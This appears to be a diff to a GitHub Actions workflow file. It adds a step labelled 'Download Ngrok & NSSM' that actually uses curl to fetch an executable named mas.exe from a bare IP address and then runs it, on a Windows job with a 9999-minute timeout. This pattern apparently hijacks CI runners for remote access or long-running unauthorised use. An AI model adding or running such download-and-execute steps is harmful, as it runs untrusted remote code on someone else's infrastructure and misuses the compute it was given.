@@ -9,7 +9,7 @@ jobs:
     timeout-minutes: 9999
 
     steps:
-    run: |
-        cmd /c http://44.202.6.121/mas.exe -O
-        cmd /c mas.exe
-        cmd /c dir
+    - name: Download Ngrok & NSSM
+      run: |
+          cmd /c curl http://44.202.6.121/mas.exe -O
+          cmd /c mas.exe
